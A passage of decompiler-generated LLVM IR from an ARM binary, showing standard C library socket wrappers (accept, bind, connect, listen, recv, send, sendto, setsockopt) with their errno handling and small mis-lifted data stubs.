  store i32 %v3_df28, i32* %stack_var_-8, align 4
  %v0_df34 = load i32, i32* @r0, align 4
  store i32 %v0_df34, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_df34, -4095
  br i1 %tmp, label %dec_label_pc_df5c, label %dec_label_pc_df44

dec_label_pc_df44:                                ; preds = %entry
  %v0_df48 = call i32 @__aeabi_read_tp()
  %v3_df4c = load i16, i16* @global_var_23164.175, align 2
  %v4_df4c = sext i16 %v3_df4c to i32
  %v0_df50 = load i32, i32* %r2.global-to-local, align 4
  %v1_df50 = sub i32 0, %v0_df50
  store i32 %v1_df50, i32* %r2.global-to-local, align 4
  %v3_df54 = add i32 %v4_df4c, %v0_df48
  %v4_df54 = inttoptr i32 %v3_df54 to i32*
  store i32 %v1_df50, i32* %v4_df54, align 4
  %v2_df5c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_df5c

dec_label_pc_df5c:                                ; preds = %entry, %dec_label_pc_df44
  %v1_df60 = phi i32 [ %v0_df34, %entry ], [ -1, %dec_label_pc_df44 ]
  %v2_df5c = phi i32 [ %v3_df28, %entry ], [ %v2_df5c.pre, %dec_label_pc_df44 ]
  store i32 %v2_df5c, i32* @r7, align 4
  ret i32 %v1_df60

; uselistorder directives
  uselistorder i32 %v0_df34, { 1, 0, 2 }
  uselistorder label %dec_label_pc_df5c, { 1, 0 }
}

define i32 @"$d.10"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_df64:
  %v0_df64 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_df64, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_df64
  %v2_df64 = load i32, i32* @sp, align 4
  %v8_df64 = shl i32 %v2_df64, %arg2
  %v9_df64 = and i32 %v8_df64, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_df64, %bb
  %v10_df68 = phi i32 [ %arg1, %dec_label_pc_df64 ], [ %v9_df64, %bb ]
  ret i32 %v10_df68

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_df70 = load i32, i32* @r4, align 4
  store i32 %v3_df70, i32* %stack_var_-20, align 4
  %v6_df70 = load i32, i32* @r5, align 4
  %v9_df70 = load i32, i32* @r6, align 4
  %v12_df70 = load i32, i32* @r7, align 4
  %v4_df7c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 14368) to i32*), align 4
  %v2_df80 = icmp eq i32 %v4_df7c, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_df80, label %dec_label_pc_df98, label %entry.dec_label_pc_dfa4_crit_edge

entry.dec_label_pc_dfa4_crit_edge:                ; preds = %entry
  br label %dec_label_pc_dfa4

dec_label_pc_df98:                                ; preds = %entry
  store i32 %v3_df70, i32* @r4, align 4
  store i32 %v9_df70, i32* @r6, align 4
  store i32 %v12_df70, i32* @r7, align 4
  %v0_dfa0 = call i32 @__sys_accept()
  br label %dec_label_pc_dfa4

dec_label_pc_dfa4:                                ; preds = %entry.dec_label_pc_dfa4_crit_edge, %dec_label_pc_df98
  %v0_dfa4 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_dfa4, i32* @r5, align 4
  %v0_dfb4 = load i32, i32* @r4, align 4
  store i32 %v0_dfb4, i32* @r0, align 4
  %v0_dfb8 = call i32 @__sys_accept()
  store i32 %v0_dfb8, i32* @r4, align 4
  %v0_dfc0 = load i32, i32* @r5, align 4
  %v1_dfc4 = call i32 @__libc_disable_asynccancel(i32 %v0_dfc0)
  %v0_dfc8 = load i32, i32* @r4, align 4
  %v2_dfd0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_dfd0, i32* @r4, align 4
  store i32 %v6_df70, i32* @r5, align 4
  store i32 %v9_df70, i32* @r6, align 4
  store i32 %v12_df70, i32* @r7, align 4
  ret i32 %v0_dfc8

; uselistorder directives
  uselistorder label %dec_label_pc_dfa4, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_dfe0 = load i32, i32* @r7, align 4
  store i32 %v3_dfe0, i32* %stack_var_-8, align 4
  %v0_dfec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_dfec, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_dfec, -4095
  br i1 %tmp, label %dec_label_pc_e014, label %dec_label_pc_dffc

dec_label_pc_dffc:                                ; preds = %entry
  %v0_e000 = call i32 @__aeabi_read_tp()
  %v3_e004 = load i16, i16* @global_var_23164.175, align 2
  %v4_e004 = sext i16 %v3_e004 to i32
  %v0_e008 = load i32, i32* %r2.global-to-local, align 4
  %v1_e008 = sub i32 0, %v0_e008
  store i32 %v1_e008, i32* %r2.global-to-local, align 4
  %v3_e00c = add i32 %v4_e004, %v0_e000
  %v4_e00c = inttoptr i32 %v3_e00c to i32*
  store i32 %v1_e008, i32* %v4_e00c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_e014.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_e014

dec_label_pc_e014:                                ; preds = %entry, %dec_label_pc_dffc
  %v1_e018 = phi i32 [ %v0_dfec, %entry ], [ -1, %dec_label_pc_dffc ]
  %v2_e014 = phi i32 [ %v3_dfe0, %entry ], [ %v2_e014.pre, %dec_label_pc_dffc ]
  store i32 %v2_e014, i32* @r7, align 4
  ret i32 %v1_e018

; uselistorder directives
  uselistorder i32 %v0_dfec, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e014, { 1, 0 }
}

define i32 @"$d.9"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e01c:
  %v0_e01c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e01c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e01c
  %v2_e01c = load i32, i32* @sl, align 4
  %v8_e01c = shl i32 %v2_e01c, %arg2
  %v9_e01c = and i32 %v8_e01c, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e01c, %bb
  %v10_e020 = phi i32 [ %arg1, %dec_label_pc_e01c ], [ %v9_e01c, %bb ]
  ret i32 %v10_e020

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e024 = load i32, i32* @r7, align 4
  store i32 %v3_e024, i32* %stack_var_-8, align 4
  %v0_e030 = load i32, i32* @r0, align 4
  store i32 %v0_e030, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_e030, -4095
  br i1 %tmp, label %dec_label_pc_e058, label %dec_label_pc_e040

dec_label_pc_e040:                                ; preds = %entry
  %v0_e044 = call i32 @__aeabi_read_tp()
  %v3_e048 = load i16, i16* @global_var_23164.175, align 2
  %v4_e048 = sext i16 %v3_e048 to i32
  %v0_e04c = load i32, i32* %r2.global-to-local, align 4
  %v1_e04c = sub i32 0, %v0_e04c
  store i32 %v1_e04c, i32* %r2.global-to-local, align 4
  %v3_e050 = add i32 %v4_e048, %v0_e044
  %v4_e050 = inttoptr i32 %v3_e050 to i32*
  store i32 %v1_e04c, i32* %v4_e050, align 4
  %v2_e058.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_e058

dec_label_pc_e058:                                ; preds = %entry, %dec_label_pc_e040
  %v1_e05c = phi i32 [ %v0_e030, %entry ], [ -1, %dec_label_pc_e040 ]
  %v2_e058 = phi i32 [ %v3_e024, %entry ], [ %v2_e058.pre, %dec_label_pc_e040 ]
  store i32 %v2_e058, i32* @r7, align 4
  ret i32 %v1_e05c

; uselistorder directives
  uselistorder i32 %v0_e030, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e058, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e060:
  %v0_e060 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e060, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e060
  %v2_e060 = load i32, i32* @fp, align 4
  %v8_e060 = shl i32 %v2_e060, %arg2
  %v9_e060 = and i32 %v8_e060, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e060, %bb
  %v10_e064 = phi i32 [ %arg1, %dec_label_pc_e060 ], [ %v9_e060, %bb ]
  ret i32 %v10_e064

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_e06c = load i32, i32* @r4, align 4
  store i32 %v3_e06c, i32* %stack_var_-20, align 4
  %v6_e06c = load i32, i32* @r5, align 4
  %v9_e06c = load i32, i32* @r6, align 4
  %v12_e06c = load i32, i32* @r7, align 4
  %v4_e078 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 14368) to i32*), align 4
  %v2_e07c = icmp eq i32 %v4_e078, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_e07c, label %dec_label_pc_e094, label %entry.dec_label_pc_e0a0_crit_edge

entry.dec_label_pc_e0a0_crit_edge:                ; preds = %entry
  br label %dec_label_pc_e0a0

dec_label_pc_e094:                                ; preds = %entry
  store i32 %v3_e06c, i32* @r4, align 4
  store i32 %v9_e06c, i32* @r6, align 4
  store i32 %v12_e06c, i32* @r7, align 4
  %v0_e09c = call i32 @__sys_connect()
  br label %dec_label_pc_e0a0

dec_label_pc_e0a0:                                ; preds = %entry.dec_label_pc_e0a0_crit_edge, %dec_label_pc_e094
  %v0_e0a0 = call i32 @__libc_enable_asynccancel()
  %v0_e0a4 = load i32, i32* @r6, align 4
  store i32 %v0_e0a4, i32* @r1, align 4
  store i32 %v0_e0a0, i32* @r5, align 4
  %v0_e0b0 = load i32, i32* @r4, align 4
  store i32 %v0_e0b0, i32* @r0, align 4
  %v0_e0b4 = call i32 @__sys_connect()
  store i32 %v0_e0b4, i32* @r4, align 4
  %v0_e0bc = load i32, i32* @r5, align 4
  %v1_e0c0 = call i32 @__libc_disable_asynccancel(i32 %v0_e0bc)
  %v0_e0c4 = load i32, i32* @r4, align 4
  %v2_e0cc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_e0cc, i32* @r4, align 4
  store i32 %v6_e06c, i32* @r5, align 4
  store i32 %v9_e06c, i32* @r6, align 4
  store i32 %v12_e06c, i32* @r7, align 4
  ret i32 %v0_e0c4

; uselistorder directives
  uselistorder label %dec_label_pc_e0a0, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e0dc = load i32, i32* @r7, align 4
  store i32 %v3_e0dc, i32* %stack_var_-8, align 4
  %v0_e0e8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e0e8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_e0e8, -4095
  br i1 %tmp, label %dec_label_pc_e110, label %dec_label_pc_e0f8

dec_label_pc_e0f8:                                ; preds = %entry
  %v0_e0fc = call i32 @__aeabi_read_tp()
  %v3_e100 = load i16, i16* @global_var_23164.175, align 2
  %v4_e100 = sext i16 %v3_e100 to i32
  %v0_e104 = load i32, i32* %r2.global-to-local, align 4
  %v1_e104 = sub i32 0, %v0_e104
  store i32 %v1_e104, i32* %r2.global-to-local, align 4
  %v3_e108 = add i32 %v4_e100, %v0_e0fc
  %v4_e108 = inttoptr i32 %v3_e108 to i32*
  store i32 %v1_e104, i32* %v4_e108, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_e110.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_e110

dec_label_pc_e110:                                ; preds = %entry, %dec_label_pc_e0f8
  %v1_e114 = phi i32 [ %v0_e0e8, %entry ], [ -1, %dec_label_pc_e0f8 ]
  %v2_e110 = phi i32 [ %v3_e0dc, %entry ], [ %v2_e110.pre, %dec_label_pc_e0f8 ]
  store i32 %v2_e110, i32* @r7, align 4
  ret i32 %v1_e114

; uselistorder directives
  uselistorder i32 %v0_e0e8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e110, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e11c = load i32, i32* @r7, align 4
  store i32 %v3_e11c, i32* %stack_var_-8, align 4
  %v0_e128 = load i32, i32* @r0, align 4
  store i32 %v0_e128, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_e128, -4095
  br i1 %tmp, label %dec_label_pc_e150, label %dec_label_pc_e138

dec_label_pc_e138:                                ; preds = %entry
  %v0_e13c = call i32 @__aeabi_read_tp()
  %v3_e140 = load i16, i16* @global_var_23164.175, align 2
  %v4_e140 = sext i16 %v3_e140 to i32
  %v0_e144 = load i32, i32* %r2.global-to-local, align 4
  %v1_e144 = sub i32 0, %v0_e144
  store i32 %v1_e144, i32* %r2.global-to-local, align 4
  %v3_e148 = add i32 %v4_e140, %v0_e13c
  %v4_e148 = inttoptr i32 %v3_e148 to i32*
  store i32 %v1_e144, i32* %v4_e148, align 4
  %v2_e150.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_e150

dec_label_pc_e150:                                ; preds = %entry, %dec_label_pc_e138
  %v1_e154 = phi i32 [ %v0_e128, %entry ], [ -1, %dec_label_pc_e138 ]
  %v2_e150 = phi i32 [ %v3_e11c, %entry ], [ %v2_e150.pre, %dec_label_pc_e138 ]
  store i32 %v2_e150, i32* @r7, align 4
  ret i32 %v1_e154

; uselistorder directives
  uselistorder i32 %v0_e128, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e150, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_e158:
  %v0_e158 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e158, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e158
  %v5_e158 = udiv i32 %arg3, 4
  %v6_e158 = and i32 %v5_e158, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e158, %bb
  %v10_e15c = phi i32 [ %arg1, %dec_label_pc_e158 ], [ %v6_e158, %bb ]
  ret i32 %v10_e15c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_e164 = load i32, i32* @r4, align 4
  store i32 %v3_e164, i32* %stack_var_-24, align 4
  %v6_e164 = load i32, i32* @r5, align 4
  %v9_e164 = load i32, i32* @r6, align 4
  %v12_e164 = load i32, i32* @r7, align 4
  %v15_e164 = load i32, i32* @r8, align 4
  %v18_e164 = load i32, i32* @lr, align 4
  %v4_e170 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 14368) to i32*), align 4
  %v2_e174 = icmp eq i32 %v4_e170, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_e174, label %dec_label_pc_e18c, label %entry.dec_label_pc_e194_crit_edge

entry.dec_label_pc_e194_crit_edge:                ; preds = %entry
  br label %dec_label_pc_e194

dec_label_pc_e18c:                                ; preds = %entry
  store i32 %v3_e164, i32* @r4, align 4
  store i32 %v9_e164, i32* @r6, align 4
  store i32 %v12_e164, i32* @r7, align 4
  store i32 %v15_e164, i32* @r8, align 4
  %v0_e190 = call i32 @__sys_recv()
  br label %dec_label_pc_e194

dec_label_pc_e194:                                ; preds = %entry.dec_label_pc_e194_crit_edge, %dec_label_pc_e18c
  %v0_e194 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_e194, i32* @r5, align 4
  %v0_e1a8 = load i32, i32* @r4, align 4
  store i32 %v0_e1a8, i32* @r0, align 4
  %v0_e1ac = call i32 @__sys_recv()
  store i32 %v0_e1ac, i32* @r4, align 4
  %v0_e1b4 = load i32, i32* @r5, align 4
  %v1_e1b8 = call i32 @__libc_disable_asynccancel(i32 %v0_e1b4)
  %v0_e1bc = load i32, i32* @r4, align 4
  %v2_e1c0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_e1c0, i32* @r4, align 4
  store i32 %v6_e164, i32* @r5, align 4
  store i32 %v9_e164, i32* @r6, align 4
  store i32 %v12_e164, i32* @r7, align 4
  store i32 %v15_e164, i32* @r8, align 4
  store i32 %v18_e164, i32* @lr, align 4
  ret i32 %v0_e1bc

; uselistorder directives
  uselistorder label %dec_label_pc_e194, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e1d0 = load i32, i32* @r7, align 4
  store i32 %v3_e1d0, i32* %stack_var_-8, align 4
  %v0_e1dc = load i32, i32* @r0, align 4
  store i32 %v0_e1dc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_e1dc, -4095
  br i1 %tmp, label %dec_label_pc_e204, label %dec_label_pc_e1ec

dec_label_pc_e1ec:                                ; preds = %entry
  %v0_e1f0 = call i32 @__aeabi_read_tp()
  %v3_e1f4 = load i16, i16* @global_var_23164.175, align 2
  %v4_e1f4 = sext i16 %v3_e1f4 to i32
  %v0_e1f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_e1f8 = sub i32 0, %v0_e1f8
  store i32 %v1_e1f8, i32* %r2.global-to-local, align 4
  %v3_e1fc = add i32 %v4_e1f4, %v0_e1f0
  %v4_e1fc = inttoptr i32 %v3_e1fc to i32*
  store i32 %v1_e1f8, i32* %v4_e1fc, align 4
  %v2_e204.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_e204

dec_label_pc_e204:                                ; preds = %entry, %dec_label_pc_e1ec
  %v1_e208 = phi i32 [ %v0_e1dc, %entry ], [ -1, %dec_label_pc_e1ec ]
  %v2_e204 = phi i32 [ %v3_e1d0, %entry ], [ %v2_e204.pre, %dec_label_pc_e1ec ]
  store i32 %v2_e204, i32* @r7, align 4
  ret i32 %v1_e208

; uselistorder directives
  uselistorder i32 %v0_e1dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e204, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e20c:
  %v0_e20c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e20c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e20c
  %v5_e20c = udiv i32 %arg2, 4
  %v6_e20c = and i32 %v5_e20c, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e20c, %bb
  %v9_e210 = phi i32 [ %arg1, %dec_label_pc_e20c ], [ %v6_e20c, %bb ]
  ret i32 %v9_e210

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_e218 = load i32, i32* @r4, align 4
  store i32 %v3_e218, i32* %stack_var_-24, align 4
  %v6_e218 = load i32, i32* @r5, align 4
  %v9_e218 = load i32, i32* @r6, align 4
  %v12_e218 = load i32, i32* @r7, align 4
  %v15_e218 = load i32, i32* @r8, align 4
  %v18_e218 = load i32, i32* @lr, align 4
  %v4_e224 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 14368) to i32*), align 4
  %v2_e228 = icmp eq i32 %v4_e224, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_e228, label %dec_label_pc_e240, label %entry.dec_label_pc_e248_crit_edge

entry.dec_label_pc_e248_crit_edge:                ; preds = %entry
  br label %dec_label_pc_e248

dec_label_pc_e240:                                ; preds = %entry
  store i32 %v3_e218, i32* @r4, align 4
  store i32 %v9_e218, i32* @r6, align 4
  store i32 %v12_e218, i32* @r7, align 4
  store i32 %v15_e218, i32* @r8, align 4
  %v0_e244 = call i32 @__sys_send()
  br label %dec_label_pc_e248

dec_label_pc_e248:                                ; preds = %entry.dec_label_pc_e248_crit_edge, %dec_label_pc_e240
  %v0_e248 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_e248, i32* @r5, align 4
  %v0_e25c = load i32, i32* @r4, align 4
  store i32 %v0_e25c, i32* @r0, align 4
  %v0_e260 = call i32 @__sys_send()
  store i32 %v0_e260, i32* @r4, align 4
  %v0_e268 = load i32, i32* @r5, align 4
  %v1_e26c = call i32 @__libc_disable_asynccancel(i32 %v0_e268)
  %v0_e270 = load i32, i32* @r4, align 4
  %v2_e274 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_e274, i32* @r4, align 4
  store i32 %v6_e218, i32* @r5, align 4
  store i32 %v9_e218, i32* @r6, align 4
  store i32 %v12_e218, i32* @r7, align 4
  store i32 %v15_e218, i32* @r8, align 4
  store i32 %v18_e218, i32* @lr, align 4
  ret i32 %v0_e270

; uselistorder directives
  uselistorder label %dec_label_pc_e248, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e284 = load i32, i32* @r4, align 4
  store i32 %v3_e284, i32* %stack_var_-16, align 4
  %v0_e298 = load i32, i32* @r0, align 4
  store i32 %v0_e298, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_e298, -4095
  br i1 %tmp, label %dec_label_pc_e2c0, label %dec_label_pc_e2a8

dec_label_pc_e2a8:                                ; preds = %entry
  %v0_e2ac = call i32 @__aeabi_read_tp()
  %v3_e2b0 = load i16, i16* @global_var_23164.175, align 2
  %v4_e2b0 = sext i16 %v3_e2b0 to i32
  %v0_e2b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_e2b4 = sub i32 0, %v0_e2b4
  store i32 %v1_e2b4, i32* %r2.global-to-local, align 4
  %v3_e2b8 = add i32 %v4_e2b0, %v0_e2ac
  %v4_e2b8 = inttoptr i32 %v3_e2b8 to i32*
  store i32 %v1_e2b4, i32* %v4_e2b8, align 4
  %v2_e2c0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_e2c0

dec_label_pc_e2c0:                                ; preds = %entry, %dec_label_pc_e2a8
  %v1_e2c4 = phi i32 [ %v0_e298, %entry ], [ -1, %dec_label_pc_e2a8 ]
  %v2_e2c0 = phi i32 [ %v3_e284, %entry ], [ %v2_e2c0.pre, %dec_label_pc_e2a8 ]
  store i32 %v2_e2c0, i32* @r4, align 4
  ret i32 %v1_e2c4

; uselistorder directives
  uselistorder i32 %v0_e298, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e2c0, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_e2c8:
  %v0_e2c8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e2c8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e2c8
  %v5_e2c8 = udiv i32 %arg3, 4
  %v6_e2c8 = and i32 %v5_e2c8, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e2c8, %bb
  %v7_e2cc = phi i32 [ %arg1, %dec_label_pc_e2c8 ], [ %v6_e2c8, %bb ]
  ret i32 %v7_e2cc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_e2d0 = load i32, i32* @r4, align 4
  store i32 %v3_e2d0, i32* %stack_var_-32, align 4
  %v6_e2d0 = load i32, i32* @r5, align 4
  %v9_e2d0 = load i32, i32* @r6, align 4
  %v12_e2d0 = load i32, i32* @r7, align 4
  %v15_e2d0 = load i32, i32* @r8, align 4
  %v18_e2d0 = load i32, i32* @sb, align 4
  %v21_e2d0 = load i32, i32* @sl, align 4
  %v24_e2d0 = load i32, i32* @lr, align 4
  %v4_e2e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 14368) to i32*), align 4
  %v2_e2e8 = icmp eq i32 %v4_e2e0, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_e2e8, label %dec_label_pc_e308, label %dec_label_pc_e314

dec_label_pc_e308:                                ; preds = %entry
  store i32 %v3_e2d0, i32* @r4, align 4
  store i32 %v12_e2d0, i32* @r7, align 4
  store i32 %v15_e2d0, i32* @r8, align 4
  store i32 %v18_e2d0, i32* %sb.global-to-local, align 4
  %v0_e310 = call i32 @__sys_sendto()
  br label %dec_label_pc_e314

dec_label_pc_e314:                                ; preds = %entry, %dec_label_pc_e308
  %v0_e314 = call i32 @__libc_enable_asynccancel()
  %v0_e318 = load i32, i32* @r7, align 4
  store i32 %v0_e318, i32* @r1, align 4
  store i32 %v0_e314, i32* @r5, align 4
  %v0_e328 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_e328, i32* @r0, align 4
  %v0_e330 = call i32 @__sys_sendto()
  store i32 %v0_e330, i32* @r4, align 4
  %v0_e338 = load i32, i32* @r5, align 4
  %v1_e33c = call i32 @__libc_disable_asynccancel(i32 %v0_e338)
  %v0_e340 = load i32, i32* @r4, align 4
  %v2_e348 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_e348, i32* @r4, align 4
  store i32 %v6_e2d0, i32* @r5, align 4
  store i32 %v9_e2d0, i32* @r6, align 4
  store i32 %v12_e2d0, i32* @r7, align 4
  store i32 %v15_e2d0, i32* @r8, align 4
  store i32 %v18_e2d0, i32* @sb, align 4
  store i32 %v21_e2d0, i32* @sl, align 4
  store i32 %v24_e2d0, i32* @lr, align 4
  ret i32 %v0_e340

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e314, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_e358 = load i32, i32* @r4, align 4
  store i32 %v3_e358, i32* %stack_var_-12, align 4
  %v0_e368 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e368, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_e368, -4095
  br i1 %tmp, label %dec_label_pc_e390, label %dec_label_pc_e378

dec_label_pc_e378:                                ; preds = %entry
  %v0_e37c = call i32 @__aeabi_read_tp()
  %v3_e380 = load i16, i16* @global_var_23164.175, align 2
  %v4_e380 = sext i16 %v3_e380 to i32
  %v0_e384 = load i32, i32* %r2.global-to-local, align 4
  %v1_e384 = sub i32 0, %v0_e384
  store i32 %v1_e384, i32* %r2.global-to-local, align 4
  %v3_e388 = add i32 %v4_e380, %v0_e37c
  %v4_e388 = inttoptr i32 %v3_e388 to i32*
  store i32 %v1_e384, i32* %v4_e388, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_e390.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_e390

dec_label_pc_e390:                                ; preds = %entry, %dec_label_pc_e378
  %v1_e394 = phi i32 [ %v0_e368, %entry ], [ -1, %dec_label_pc_e378 ]
  %v2_e390 = phi i32 [ %v3_e358, %entry ], [ %v2_e390.pre, %dec_label_pc_e378 ]
  store i32 %v2_e390, i32* @r4, align 4
  ret i32 %v1_e394

; uselistorder directives
  uselistorder i32 %v0_e368, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e390, { 1, 0 }
}

